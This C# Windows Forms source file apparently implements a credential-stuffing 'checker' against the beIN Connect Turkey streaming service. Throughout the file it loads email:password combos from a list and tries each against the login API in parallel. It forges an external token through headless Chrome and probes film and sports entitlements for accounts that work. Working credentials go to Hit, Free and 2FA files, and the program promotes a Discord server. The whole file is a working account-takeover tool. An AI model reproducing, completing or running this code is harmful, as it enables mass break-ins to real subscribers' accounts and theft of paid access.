using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using Parsing;
using RuriLib.Http;
using RuriLib.Http.Models;
using RuriLib.Parallelization;
using RuriLib.Parallelization.Models;
using RuriLib.Proxies;
using RuriLib.Proxies.Clients;
using System.Diagnostics;
using System.Text;

namespace RecooChecker
{

    public partial class Form1 : Form
    {
        public enum Status
        {
            Good,
            Bad,
            Free,
            Premium,
            Ban,
            None
        }
        class Result
        {
            private string email;
            private string password;
            private Status status;

            public string Email { get => email; set => email = value; }
            public string Password { get => password; set => password = value; }
            public Status Status { get => status; set => status = value; }
        }



        public Form1()
        {
            InitializeComponent();
        }


        public static IEnumerable<string> wordlist = null;
        public object email { get; private set; }
        public object password { get; private set; }

        private static Parallelizer<string, Result> parallelizer = null;

        public int bad;
        public int check;
        public int good;
        public int free;
        public int error1;
        private bool tokenalcam1;
        private string tokenn;
        private string cap_film;
        private string cap_spor;

        public void tokenalcam()
        {
            var chromeOptions = new ChromeOptions();
            chromeOptions.AddArguments("headless");
            var driverService = ChromeDriverService.CreateDefaultService();
            driverService.HideCommandPromptWindow = true;
            var driver = new ChromeDriver(driverService, chromeOptions);

            driver.Url = "https://smrtlg.beinconnect.com.tr/";
            Thread.Sleep(2000);
            var tokenal = driver.ExecuteScript("var tokenModel = {Username: \"StandaloneSmartTv\",Password: \"StandaloneProject\",DateCreated: new Date() }; var externalToken = (new PlaySecurity(this.Client)).EncryptJSON(tokenModel); document.write(externalToken);");
            tokenn = driver.FindElement(By.XPath("/html/body")).Text;
            driver.Quit();
        }

        public async void HttpAyar()
        {

            if (!Directory.Exists(Environment.CurrentDirectory + @"\Result"))
            {
                Directory.CreateDirectory(Environment.CurrentDirectory + @"\Result");
            }

            void update() // Update Label //
            {
                check_label.Text = Convert.ToString(check);
                bad_label.Text = Convert.ToString(bad);
                hit_label.Text = Convert.ToString(good);
                free_label.Text = Convert.ToString(free);
                error_label.Text = Convert.ToString(error1);
                progressbar.Maximum = Convert.ToInt32(total_label.Text) + 1;
                progressbar.Value++;
                cpm_label.Text = Convert.ToString(parallelizer.CPM);
            }

            void check1()
            {
                tokenalcam();
                tokenalcam1 = false;
            }


            Func<string, CancellationToken, Task<Result>> parityCheck = new(async (number, token) => // Function //
            {
                if (tokenalcam1==true)
                {
                    check1();
                }

                var result = new Result();
                // Combo //

                var email = number.Split(":")[0];
                var password = number.Split(":")[1];


                //Http Settings //

                var settings = new ProxySettings();
                var clientproxy = new NoProxyClient(settings);

                using var client = new RLHttpClient(clientproxy);
                // Create the request //
                using var request = new HttpRequest
                {
                    Uri = new Uri("https://mobileservice-smarttv.beinconnect.com.tr/api/loginstv?rnd=0.2826150140266066"),
                    Method = HttpMethod.Post,
                    Headers = new Dictionary<string, string> // Header //
                    {
                        {"accept", " application/json, text/javascript, */*; q=0.01 "},
                        {"accept-encoding", " gzip, deflate, br "},
                        {"accept-language", " tr-TR,tr;q=0.9 "},
                        {"authorization", " %7b%22init%22%3a%22%2522H4sIAAAAAAAEAIVRQW7CMBD8S84NCkkIprcAokUqIJGI%252b9reqJYcG23iVm3Vv9dIxBAuPc6MZmZH%252bxOt8UMJ3MroOeI4LXAOEKcFa2K%252bWKQxiiaJZ%252fOCsTTJWN7I6Onq2EOL3lPtymNdnwJdf509bZzWA7MkMHJM7axEPaYO3QmpU9b4zBC2UdR%252bAmGQ7h2vQPJf8aEXjGtA9I6QBmXbHa3tB1QJQjSV%252bg7O1dmVXI1RGqA1BkXv6%252b93H7qSxPuAbruySTZJeJ5P%252fcCVVmj6h9uvcOmUlnvX8tuVL2jfrIBL0%252bVVs4Rlv3%252b9VQ5zvAEAAA%253d%253d%2522%22%2c%22uinf%22%3anull%7d "},
                        {"childroomactivated", " false "},
                        {"content-type", " application/json "},
                        {"origin", " https://smrtlg.beinconnect.com.tr"},
                        {"referer", " https://smrtlg.beinconnect.com.tr/ "},
                        {"sec-fetch-dest", " empty "},
                        {"sec-fetch-mode", " cors "},
                        {"sec-fetch-site", " same-site "},
                        {"sec-gpc", " 1 "},
                        {"user-agent", " Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 "},
                    },
                    
                    // Post Data //
                    Content = new StringContent($"{{\"UserName\":\"{email}\",\"Password\":\"{password}\",\"ExternalToken\":\"{tokenn}\"}}", Encoding.UTF8, "application/json")
                };

                update();

                // Send request //
                using var req = await client.SendAsync(request);

                // Read response //
                var response = await req.Content.ReadAsStringAsync();

                // Keycheck //
                if (response.Contains("accountNumber"))
                {
                    var access = JsonParser.GetValuesByKey(response, "accessToken").FirstOrDefault();
                    using var request1 = new HttpRequest
                    {
                        Uri = new Uri("https://mobileservice-smarttv-lg.beinconnect.com.tr/api/checkentitlement?rnd=0.4915075141030736"),
                        Method = HttpMethod.Post,
                        Headers = new Dictionary<string, string> // Header //
                        {   
                        {"accept", " application/json, text/javascript, */*; q=0.01 "},
                        {"accept-encoding", " gzip, deflate, br "},
                        {"accept-language", " tr-TR,tr;q=0.9 "},
                        {"authorization", $"{access}"},
                        {"childroomactivated", " false "},
                        {"content-type", " application/json "},
                        {"origin", " https://smrtlg.beinconnect.com.tr"},
                        {"referer", " https://smrtlg.beinconnect.com.tr/ "},
                        {"sec-fetch-dest", " empty "},
                        {"sec-fetch-mode", " cors "},
                        {"sec-fetch-site", " same-site "},
                        {"sec-gpc", " 1 "},
                        {"user-agent", " Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 "},
                        },

                        // Post Data //
                        Content = new StringContent("{\"CmsContentId\":\"PT0000225211\",\"IsPortrayal\":false}", Encoding.UTF8, "application/json")
                    };

                    using var req1 = await client.SendAsync(request1); // Capture Film //

                    var response1 = await req1.Content.ReadAsStringAsync(); // Capture Film //

                    if (response1.Contains("Bu içeriði izlemek için yetkiniz bulunmamaktadýr"))
                    {
                        cap_film = "Yok";
                    }
                    else if (response1.Contains("Talebiniz üzerine üyeliðiniz dondurulmuþtur"))
                    {
                        cap_film = "Yok";
                    }
                    else
                    {
                        cap_film = "Var";
                    }


                    using var request2 = new HttpRequest
                    {
                        Uri = new Uri("https://mobileservice-smarttv-lg.beinconnect.com.tr/api/v2/live/events/PT0000363200/usages/981964/cdn/2/alternate/3?rnd=0.961406373113151"),
                        Method = HttpMethod.Get,
                        Headers = new Dictionary<string, string> // Header //
                        {
                        {"accept", " application/json, text/javascript, */*; q=0.01 "},
                        {"accept-encoding", " gzip, deflate, br "},
                        {"accept-language", " tr-TR,tr;q=0.9 "},
                        {"authorization", $"{access}"},
                        {"childroomactivated", " false "},
                        {"content-type", " application/json "},
                        {"origin", " https://smrtlg.beinconnect.com.tr "},
                        {"referer", " https://smrtlg.beinconnect.com.tr/ "},
                        {"sec-fetch-dest", " empty "},
                        {"sec-fetch-mode", " cors "},
                        {"sec-fetch-site", " same-site "},
                        {"sec-gpc", " 1 "},
                        {"user-agent", " Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 "},
                        },
                    };

                    using var req2 = await client.SendAsync(request2); // Capture Film //

                    var response2 = await req2.Content.ReadAsStringAsync(); // Capture Film //


                    if (response2.Contains("Bu içeriði izlemek için yetkiniz bulunmamaktadýr"))
                    {
                        cap_spor = "Yok";
                    }
                    else if (response2.Contains("Talebiniz üzerine üyeliðiniz dondurulmuþtur"))
                    {
                        cap_spor = "Yok";
                    }
                    else
                    {
                        
                        cap_spor = "Var";
                    }

                    Interlocked.Increment(ref good);
                    Interlocked.Increment(ref check);
                    File.AppendAllText(@"Result\Hit.txt", email + ':' + password + ':' + cap_spor +':'+ cap_film + '\n');

                }

                else if (response.Contains("Üyelik ya da Þifre bilgisi geçersiz"))
                {
                    Interlocked.Increment(ref bad);
                    Interlocked.Increment(ref check);
                }
                else if (response.Contains("yeni þifre"))
                {
                    Interlocked.Increment(ref free);
                    Interlocked.Increment(ref check);
                    File.AppendAllText(@"Result\Free.txt", email + ':' + password + '\n');
                }
                else if (response.Contains("aktivasyon kodu"))
                {
                    Interlocked.Increment(ref free);
                    Interlocked.Increment(ref check);
                    File.AppendAllText(@"Result\2FA.txt", email + ':' + password + '\n');
                }
                else if (response.Contains("onay kodu"))
                {
                    Interlocked.Increment(ref free);
                    Interlocked.Increment(ref check);
                    File.AppendAllText(@"Result\2FA.txt", email + ':' + password + '\n');
                }
                else if (response.Contains("Giriþ yetkiniz bulunmamaktadýr"))
                {
                    Interlocked.Increment(ref free);
                    Interlocked.Increment(ref check);
                    File.AppendAllText(@"Result\Free.txt", email + ':' + password + '\n');
                }
                else if (response.Contains("televizyonunuzun saat"))
                {
                    File.AppendAllText(@"Result\Log-Error.txt", response + '\n');
                    Interlocked.Increment(ref error1);
                    tokenalcam1 = true;
                }
                else
                {
                    File.AppendAllText(@"Result\Log-Error.txt", response + '\n');
                    Interlocked.Increment(ref error1);
                }

                return result;
            });




            wordlist = File.ReadLines("combo.txt");
            parallelizer = ParallelizerFactory<string, Result>.Create(
            type: ParallelizerType.TaskBased,
            workItems: wordlist,
            workFunction: parityCheck,
            degreeOfParallelism: 6, // Thread number //
            totalAmount: wordlist.Count(), // Get wordlist count //
            skip: 0);

            parallelizer.NewResult += OnResult;
            parallelizer.Completed += OnCompleted;
            parallelizer.Error += OnException;
            parallelizer.TaskError += OnTaskError;

            await parallelizer.Start();

            try
            {
                var cts = new CancellationTokenSource();
                cts.CancelAfter(10000);
                await parallelizer.WaitCompletion(cts.Token);
            }
            catch (Exception ex)
            {
                File.AppendAllText(@"Result\Log-Error.txt", ex.ToString() + "\n\n");
                Interlocked.Increment(ref error1);
            }


            static void OnResult(object sender, ResultDetails<string, Result> value)
            {
                //Console.WriteLine($"Got result {value.Result} from the parity check of {value.Item}");
            }
          
            void OnTaskError(object sender, ErrorDetails<string> details)
            {
                //Interlocked.Increment(ref error1);
            }

            void OnException(object sender, Exception ex) => Interlocked.Increment(ref error1);

            static void OnCompleted(object sender, EventArgs e) => MessageBox.Show("Check Tamamlandý!");
            update();
        }


        private void Start_Click(object sender, EventArgs e) // Start Button //
        {
            tokenalcam();
            HttpAyar();
            total_label.Text = wordlist.Count().ToString();
        }


        private void Stop_Click(object sender, EventArgs e) => parallelizer.Stop(); // Stop Button //

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) => Process.Start(new ProcessStartInfo { FileName = @"https://discord.gg/Xd8VfYPHB3", UseShellExecute = true });

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            Hitlist myForm = new Hitlist();
            //this.Hide();   
            myForm.Show();

        }

        private void label2_Click(object sender, EventArgs e) => Process.Start("notepad.exe", "Result\\Log-Error.txt");

    }
}